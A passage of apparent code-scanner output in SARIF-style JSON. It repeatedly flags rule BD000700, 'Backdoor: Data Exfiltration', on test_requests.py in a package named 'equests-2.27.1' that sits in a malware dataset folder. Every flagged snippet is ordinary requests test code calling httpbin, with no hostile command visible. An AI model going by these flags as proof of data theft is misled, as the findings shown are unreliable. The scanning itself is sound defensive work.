                      "markdown": "`            assert test_url == preq.url\n\n    def test_auth_is_stripped_on_http_downgrade(self, httpbin, httpbin_secure, httpbin_ca_bundle):\n        r = requests.get(\n            httpbin_secure('redirect-to'),\n            params={'url': httpbin('get')},\n            auth=('user', 'pass'),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1625,
                  "startColumn": 26,
                  "endLine": 1625,
                  "endColumn": 35,
                  "snippet": {
                    "text": "            'magnet:?xt=urn:btih:be08f00302bc2d1d3cfa3af02024fa647a271431',\n        )\n        for test_url in test_urls:\n            req = requests.Request('GET', test_url)\n            preq = req.prepare()\n            assert test_url == preq.url\n\n",
                    "rendered": {
                      "text": "            'magnet:?xt=urn:btih:be08f00302bc2d1d3cfa3af02024fa647a271431',\n        )\n        for test_url in test_urls:\n            req = requests.Request('GET', test_url)\n            preq = req.prepare()\n            assert test_url == preq.url\n\n",
                      "markdown": "`            'magnet:?xt=urn:btih:be08f00302bc2d1d3cfa3af02024fa647a271431',\n        )\n        for test_url in test_urls:\n            req = requests.Request('GET', test_url)\n            preq = req.prepare()\n            assert test_url == preq.url\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1613,
                  "startColumn": 22,
                  "endLine": 1613,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    def test_autoset_header_values_are_native(self, httpbin):\n        data = 'this is a string'\n        length = '16'\n        req = requests.Request('POST', httpbin('post'), data=data)\n        p = req.prepare()\n\n        assert p.headers['Content-Length'] == length\n",
                    "rendered": {
                      "text": "    def test_autoset_header_values_are_native(self, httpbin):\n        data = 'this is a string'\n        length = '16'\n        req = requests.Request('POST', httpbin('post'), data=data)\n        p = req.prepare()\n\n        assert p.headers['Content-Length'] == length\n",
                      "markdown": "`    def test_autoset_header_values_are_native(self, httpbin):\n        data = 'this is a string'\n        length = '16'\n        req = requests.Request('POST', httpbin('post'), data=data)\n        p = req.prepare()\n\n        assert p.headers['Content-Length'] == length\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1605,
                  "startColumn": 20,
                  "endLine": 1605,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    def test_can_send_file_object_with_non_string_filename(self, httpbin):\n        f = io.BytesIO()\n        f.name = 2\n        r = requests.Request('POST', httpbin('post'), files={'f': f})\n        p = r.prepare()\n\n        assert 'multipart/form-data' in p.headers['Content-Type']\n",
                    "rendered": {
                      "text": "    def test_can_send_file_object_with_non_string_filename(self, httpbin):\n        f = io.BytesIO()\n        f.name = 2\n        r = requests.Request('POST', httpbin('post'), files={'f': f})\n        p = r.prepare()\n\n        assert 'multipart/form-data' in p.headers['Content-Type']\n",
                      "markdown": "`    def test_can_send_file_object_with_non_string_filename(self, httpbin):\n        f = io.BytesIO()\n        f.name = 2\n        r = requests.Request('POST', httpbin('post'), files={'f': f})\n        p = r.prepare()\n\n        assert 'multipart/form-data' in p.headers['Content-Type']\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1598,
                  "startColumn": 20,
                  "endLine": 1598,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    def test_can_send_objects_with_files(self, httpbin, files):\n        data = {'a': 'this is a string'}\n        files = {'b': files}\n        r = requests.Request('POST', httpbin('post'), data=data, files=files)\n        p = r.prepare()\n        assert 'multipart/form-data' in p.headers['Content-Type']\n\n",
                    "rendered": {
                      "text": "    def test_can_send_objects_with_files(self, httpbin, files):\n        data = {'a': 'this is a string'}\n        files = {'b': files}\n        r = requests.Request('POST', httpbin('post'), data=data, files=files)\n        p = r.prepare()\n        assert 'multipart/form-data' in p.headers['Content-Type']\n\n",
                      "markdown": "`    def test_can_send_objects_with_files(self, httpbin, files):\n        data = {'a': 'this is a string'}\n        files = {'b': files}\n        r = requests.Request('POST', httpbin('post'), data=data, files=files)\n        p = r.prepare()\n        assert 'multipart/form-data' in p.headers['Content-Type']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1592,
                  "startColumn": 24,
                  "endLine": 1592,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(httpbin('get'), headers=headers_space)\n        # Test for tab\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_tab)\n\n    @pytest.mark.parametrize('files', ('foo', b'foo', bytearray(b'foo')))\n    def test_can_send_objects_with_files(self, httpbin, files):\n",
                    "rendered": {
                      "text": "            r = requests.get(httpbin('get'), headers=headers_space)\n        # Test for tab\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_tab)\n\n    @pytest.mark.parametrize('files', ('foo', b'foo', bytearray(b'foo')))\n    def test_can_send_objects_with_files(self, httpbin, files):\n",
                      "markdown": "`            r = requests.get(httpbin('get'), headers=headers_space)\n        # Test for tab\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_tab)\n\n    @pytest.mark.parametrize('files', ('foo', b'foo', bytearray(b'foo')))\n    def test_can_send_objects_with_files(self, httpbin, files):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1589,
                  "startColumn": 24,
                  "endLine": 1589,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n        # Test for whitespace\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_space)\n        # Test for tab\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_tab)\n",
                    "rendered": {
                      "text": "\n        # Test for whitespace\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_space)\n        # Test for tab\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_tab)\n",
                      "markdown": "`\n        # Test for whitespace\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_space)\n        # Test for tab\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_tab)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1578,
                  "startColumn": 24,
                  "endLine": 1578,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(httpbin('get'), headers=headers_lf)\n        # Test for carriage return\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_cr)\n\n    def test_header_no_leading_space(self, httpbin):\n        \"\"\"Ensure headers containing leading whitespace raise\n",
                    "rendered": {
                      "text": "            r = requests.get(httpbin('get'), headers=headers_lf)\n        # Test for carriage return\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_cr)\n\n    def test_header_no_leading_space(self, httpbin):\n        \"\"\"Ensure headers containing leading whitespace raise\n",
                      "markdown": "`            r = requests.get(httpbin('get'), headers=headers_lf)\n        # Test for carriage return\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_cr)\n\n    def test_header_no_leading_space(self, httpbin):\n        \"\"\"Ensure headers containing leading whitespace raise\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1575,
                  "startColumn": 24,
                  "endLine": 1575,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            r = requests.get(httpbin('get'), headers=headers_ret)\n        # Test for line feed\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_lf)\n        # Test for carriage return\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_cr)\n",
                    "rendered": {
                      "text": "            r = requests.get(httpbin('get'), headers=headers_ret)\n        # Test for line feed\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_lf)\n        # Test for carriage return\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_cr)\n",
                      "markdown": "`            r = requests.get(httpbin('get'), headers=headers_ret)\n        # Test for line feed\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_lf)\n        # Test for carriage return\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_cr)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1572,
                  "startColumn": 24,
                  "endLine": 1572,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n        # Test for newline\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_ret)\n        # Test for line feed\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_lf)\n",
                    "rendered": {
                      "text": "\n        # Test for newline\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_ret)\n        # Test for line feed\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_lf)\n",
                      "markdown": "`\n        # Test for newline\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_ret)\n        # Test for line feed\n        with pytest.raises(InvalidHeader):\n            r = requests.get(httpbin('get'), headers=headers_lf)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1559,
                  "startColumn": 24,
                  "endLine": 1559,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert 'bar' in str(excinfo.value)\n        # Test for list\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_list)\n        assert 'baz' in str(excinfo.value)\n\n    def test_header_no_return_chars(self, httpbin):\n",
                    "rendered": {
                      "text": "        assert 'bar' in str(excinfo.value)\n        # Test for list\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_list)\n        assert 'baz' in str(excinfo.value)\n\n    def test_header_no_return_chars(self, httpbin):\n",
                      "markdown": "`        assert 'bar' in str(excinfo.value)\n        # Test for list\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_list)\n        assert 'baz' in str(excinfo.value)\n\n    def test_header_no_return_chars(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1555,
                  "startColumn": 24,
                  "endLine": 1555,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert 'foo' in str(excinfo.value)\n        # Test for dict\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_dict)\n        assert 'bar' in str(excinfo.value)\n        # Test for list\n        with pytest.raises(InvalidHeader) as excinfo:\n",
                    "rendered": {
                      "text": "        assert 'foo' in str(excinfo.value)\n        # Test for dict\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_dict)\n        assert 'bar' in str(excinfo.value)\n        # Test for list\n        with pytest.raises(InvalidHeader) as excinfo:\n",
                      "markdown": "`        assert 'foo' in str(excinfo.value)\n        # Test for dict\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_dict)\n        assert 'bar' in str(excinfo.value)\n        # Test for list\n        with pytest.raises(InvalidHeader) as excinfo:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1551,
                  "startColumn": 24,
                  "endLine": 1551,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n        # Test for int\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_int)\n        assert 'foo' in str(excinfo.value)\n        # Test for dict\n        with pytest.raises(InvalidHeader) as excinfo:\n",
                    "rendered": {
                      "text": "\n        # Test for int\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_int)\n        assert 'foo' in str(excinfo.value)\n        # Test for dict\n        with pytest.raises(InvalidHeader) as excinfo:\n",
                      "markdown": "`\n        # Test for int\n        with pytest.raises(InvalidHeader) as excinfo:\n            r = requests.get(httpbin('get'), headers=headers_int)\n        assert 'foo' in str(excinfo.value)\n        # Test for dict\n        with pytest.raises(InvalidHeader) as excinfo:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1538,
                  "startColumn": 20,
                  "endLine": 1538,
                  "endColumn": 25,
                  "snippet": {
                    "text": "                      'bar': u'fbbq'.encode('utf8'),\n                      'baz': '',\n                      'qux': '1'}\n        r = requests.get(httpbin('get'), headers=headers_ok)\n        assert r.request.headers['foo'] == headers_ok['foo']\n\n    def test_header_value_not_str(self, httpbin):\n",
                    "rendered": {
                      "text": "                      'bar': u'fbbq'.encode('utf8'),\n                      'baz': '',\n                      'qux': '1'}\n        r = requests.get(httpbin('get'), headers=headers_ok)\n        assert r.request.headers['foo'] == headers_ok['foo']\n\n    def test_header_value_not_str(self, httpbin):\n",
                      "markdown": "`                      'bar': u'fbbq'.encode('utf8'),\n                      'baz': '',\n                      'qux': '1'}\n        r = requests.get(httpbin('get'), headers=headers_ok)\n        assert r.request.headers['foo'] == headers_ok['foo']\n\n    def test_header_value_not_str(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1524,
                  "startColumn": 20,
                  "endLine": 1524,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    def test_header_keys_are_native(self, httpbin):\n        headers = {u('unicode'): 'blah', 'byte'.encode('ascii'): 'blah'}\n        r = requests.Request('GET', httpbin('get'), headers=headers)\n        p = r.prepare()\n\n        # This is testing that they are builtin strings. A bit weird, but there\n",
                    "rendered": {
                      "text": "\n    def test_header_keys_are_native(self, httpbin):\n        headers = {u('unicode'): 'blah', 'byte'.encode('ascii'): 'blah'}\n        r = requests.Request('GET', httpbin('get'), headers=headers)\n        p = r.prepare()\n\n        # This is testing that they are builtin strings. A bit weird, but there\n",
                      "markdown": "`\n    def test_header_keys_are_native(self, httpbin):\n        headers = {u('unicode'): 'blah', 'byte'.encode('ascii'): 'blah'}\n        r = requests.Request('GET', httpbin('get'), headers=headers)\n        p = r.prepare()\n\n        # This is testing that they are builtin strings. A bit weird, but there\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1519,
                  "startColumn": 20,
                  "endLine": 1519,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            'EA770032-DA4D-4D84-8CE9-29C6D910BF1E',\n            'exactly-------------sixty-----------three------------characters',\n        )\n        r = requests.Request('GET', url).prepare()\n        assert r.url == url\n\n    def test_header_keys_are_native(self, httpbin):\n",
                    "rendered": {
                      "text": "            'EA770032-DA4D-4D84-8CE9-29C6D910BF1E',\n            'exactly-------------sixty-----------three------------characters',\n        )\n        r = requests.Request('GET', url).prepare()\n        assert r.url == url\n\n    def test_header_keys_are_native(self, httpbin):\n",
                      "markdown": "`            'EA770032-DA4D-4D84-8CE9-29C6D910BF1E',\n            'exactly-------------sixty-----------three------------characters',\n        )\n        r = requests.Request('GET', url).prepare()\n        assert r.url == url\n\n    def test_header_keys_are_native(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1510,
                  "startColumn": 13,
                  "endLine": 1510,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    def test_params_are_merged_case_sensitive(self, httpbin):\n        s = requests.Session()\n        s.params['foo'] = 'bar'\n        r = s.get(httpbin('get'), params={'FOO': 'bar'})\n        assert r.json()['args'] == {'foo': 'bar', 'FOO': 'bar'}\n\n    def test_long_authinfo_in_url(self):\n",
                    "rendered": {
                      "text": "    def test_params_are_merged_case_sensitive(self, httpbin):\n        s = requests.Session()\n        s.params['foo'] = 'bar'\n        r = s.get(httpbin('get'), params={'FOO': 'bar'})\n        assert r.json()['args'] == {'foo': 'bar', 'FOO': 'bar'}\n\n    def test_long_authinfo_in_url(self):\n",
                      "markdown": "`    def test_params_are_merged_case_sensitive(self, httpbin):\n        s = requests.Session()\n        s.params['foo'] = 'bar'\n        r = s.get(httpbin('get'), params={'FOO': 'bar'})\n        assert r.json()['args'] == {'foo': 'bar', 'FOO': 'bar'}\n\n    def test_long_authinfo_in_url(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1504,
                  "startColumn": 13,
                  "endLine": 1504,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        # From issue #1321\n        s = requests.Session()\n        s.headers['foo'] = 'bar'\n        r = s.get(httpbin('get'), headers={'FOO': None})\n        assert 'foo' not in r.request.headers\n\n    def test_params_are_merged_case_sensitive(self, httpbin):\n",
                    "rendered": {
                      "text": "        # From issue #1321\n        s = requests.Session()\n        s.headers['foo'] = 'bar'\n        r = s.get(httpbin('get'), headers={'FOO': None})\n        assert 'foo' not in r.request.headers\n\n    def test_params_are_merged_case_sensitive(self, httpbin):\n",
                      "markdown": "`        # From issue #1321\n        s = requests.Session()\n        s.headers['foo'] = 'bar'\n        r = s.get(httpbin('get'), headers={'FOO': None})\n        assert 'foo' not in r.request.headers\n\n    def test_params_are_merged_case_sensitive(self, httpbin):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1420,
                  "startColumn": 20,
                  "endLine": 1420,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    def test_uppercase_scheme_redirect(self, httpbin):\n        parts = urlparse(httpbin('html'))\n        url = \"HTTP://\" + parts.netloc + parts.path\n        r = requests.get(httpbin('redirect-to'), params={'url': url})\n        assert r.status_code == 200\n        assert r.url.lower() == url.lower()\n\n",
                    "rendered": {
                      "text": "    def test_uppercase_scheme_redirect(self, httpbin):\n        parts = urlparse(httpbin('html'))\n        url = \"HTTP://\" + parts.netloc + parts.path\n        r = requests.get(httpbin('redirect-to'), params={'url': url})\n        assert r.status_code == 200\n        assert r.url.lower() == url.lower()\n\n",
                      "markdown": "`    def test_uppercase_scheme_redirect(self, httpbin):\n        parts = urlparse(httpbin('html'))\n        url = \"HTTP://\" + parts.netloc + parts.path\n        r = requests.get(httpbin('redirect-to'), params={'url': url})\n        assert r.status_code == 200\n        assert r.url.lower() == url.lower()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1411,
                  "startColumn": 13,
                  "endLine": 1411,
                  "endColumn": 18,
                  "snippet": {
                    "text": "        s = requests.Session()\n        s.headers.update({'ACCEPT': 'BOGUS'})\n        s.headers.update({'accept': 'application/json'})\n        r = s.get(httpbin('get'))\n        headers = r.request.headers\n        assert headers['accept'] == 'application/json'\n        assert headers['Accept'] == 'application/json'\n",
                    "rendered": {
                      "text": "        s = requests.Session()\n        s.headers.update({'ACCEPT': 'BOGUS'})\n        s.headers.update({'accept': 'application/json'})\n        r = s.get(httpbin('get'))\n        headers = r.request.headers\n        assert headers['accept'] == 'application/json'\n        assert headers['Accept'] == 'application/json'\n",
                      "markdown": "`        s = requests.Session()\n        s.headers.update({'ACCEPT': 'BOGUS'})\n        s.headers.update({'accept': 'application/json'})\n        r = s.get(httpbin('get'))\n        headers = r.request.headers\n        assert headers['accept'] == 'application/json'\n        assert headers['Accept'] == 'application/json'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1397,
                  "startColumn": 20,
                  "endLine": 1397,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert error.response == response\n\n    def test_session_pickling(self, httpbin):\n        r = requests.Request('GET', httpbin('get'))\n        s = requests.Session()\n\n        s = pickle.loads(pickle.dumps(s))\n",
                    "rendered": {
                      "text": "        assert error.response == response\n\n    def test_session_pickling(self, httpbin):\n        r = requests.Request('GET', httpbin('get'))\n        s = requests.Session()\n\n        s = pickle.loads(pickle.dumps(s))\n",
                      "markdown": "`        assert error.response == response\n\n    def test_session_pickling(self, httpbin):\n        r = requests.Request('GET', httpbin('get'))\n        s = requests.Session()\n\n        s = pickle.loads(pickle.dumps(s))\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_requests.py"
                },
                "region": {
                  "startLine": 1382,
                  "startColumn": 20,
                  "endLine": 1382,
                  "endColumn": 29,
                  "snippet": {
                    "text": "        assert resp.status_code == 200\n\n    def test_cannot_send_unprepared_requests(self, httpbin):\n        r = requests.Request(url=httpbin())\n        with pytest.raises(ValueError):\n            requests.Session().send(r)\n\n",
                    "rendered": {
